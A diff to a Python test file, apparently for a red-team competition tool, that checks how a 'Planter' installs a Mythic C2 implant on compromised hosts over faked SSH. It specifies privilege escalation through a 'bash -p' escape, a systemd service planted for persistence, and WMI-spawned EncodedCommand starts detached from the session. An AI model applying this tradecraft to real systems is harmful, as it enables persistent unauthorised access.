@@ -217,6 +217,65 @@ def test_planter_records_the_install_even_without_a_callback(tmp_path):
     assert "no callback" in json.dumps(info) or info["callback_seen"] is False
 
 
+def test_planter_uses_an_escape_label_and_never_sudo(tmp_path):
+    _manifest(tmp_path)
+    ssh = FakeSSH().on("is-active", rc=0, out="active")
+    ctx = make_ctx(tmp_path / "state", ssh=ssh, comp_dir=tmp_path)
+    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "user")
+    ctx.world.elevate_foothold("192.168.1.10", "escape:/usr/bin/bash -p -c")
+    ctx.c2 = FakeMythic({"web01-1": {"seen_at": ctx.now(), "agent": "poseidon"}})
+    from tlaloc.effects import execute
+    result = execute("implant_channel", {"ip": "192.168.1.10", "box_id": "web01-1"},
+                     ctx)
+    assert result.ok is True, result.detail
+    assert not ssh.sent("sudo -n")
+    assert any(c.startswith("/usr/bin/bash -p -c 'mkdir -p /usr/local/lib/")
+               for c in ssh.sent("mkdir -p /usr/local/lib/")), ssh.calls
+    assert not ssh.sent("EOF"), "the unit must be staged, not heredoc'd"
+    assert any(call.get("kind") == "sftp_put"
+               and call["cmd"].endswith(".service") for call in ssh.calls)
+    assert ctx.world.artifacts()[0]["kind"] == "c2-implant"
+
+
+def test_planter_keeps_the_sudo_label(tmp_path):
+    _manifest(tmp_path)
+    ssh = FakeSSH().on("is-active", rc=0, out="active")
+    ctx = make_ctx(tmp_path / "state", ssh=ssh)
+    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "user")
+    ctx.world.elevate_foothold("192.168.1.10", "sudo")
+    info = Planter(ctx, comp_dir=tmp_path).plant("192.168.1.10", "web01-1",
+                                                 wait_sec=0)
+    assert info["ok"] is True, info
+    assert len(ssh.sent("sudo -n")) >= 6, ssh.calls     # the six install steps (plus redundancy)
+    assert not ssh.sent("sudo -n systemctl is-active"), "the final check stays plain"
+
+
+def test_planter_installs_from_a_root_foothold_without_sudo(tmp_path):
+    _manifest(tmp_path)
+    ssh = FakeSSH().on("is-active", rc=0, out="active")
+    ctx = make_ctx(tmp_path / "state", ssh=ssh)
+    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "root")
+    info = Planter(ctx, comp_dir=tmp_path).plant("192.168.1.10", "web01-1",
+                                                 wait_sec=0)
+    assert info["ok"] is True, info
+    assert not ssh.sent("sudo")
+    assert any(c.startswith("mkdir -p /usr/local/lib/")
+               for c in ssh.sent("mkdir -p /usr/local/lib/"))
+
+
+def test_a_failed_install_step_names_the_label_and_path(tmp_path):
+    _manifest(tmp_path)
+    ssh = FakeSSH().on("mkdir -p /usr/local/lib/", rc=1,
+                       err="sudo: a password is required")
+    ctx = make_ctx(tmp_path / "state", ssh=ssh)
+    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "user")
+    ctx.world.elevate_foothold("192.168.1.10", "sudo")
+    info = Planter(ctx, comp_dir=tmp_path).plant("192.168.1.10", "web01-1",
+                                                 wait_sec=0)
+    assert info["ok"] is False
+    assert "sudo" in info["detail"] and "/usr/local/lib/" in info["detail"], info
+
+
 def test_planter_refuses_without_a_manifest_entry(tmp_path):
     _manifest(tmp_path)
     ctx = make_ctx(tmp_path / "state")
@@ -536,4 +595,3 @@ def test_the_immediate_start_is_detached_from_the_ssh_session(tmp_path):
               for c in ssh.calls if "-EncodedCommand" in (c["cmd"] or "")]
     assert any("Win32_Process" in d and "Create" in d for d in bodies), \
         "the one-shot start should spawn under the WMI service, not the ssh session"
-    assert not any('start "" /b' in (c["cmd"] or "") for c in ssh.calls)
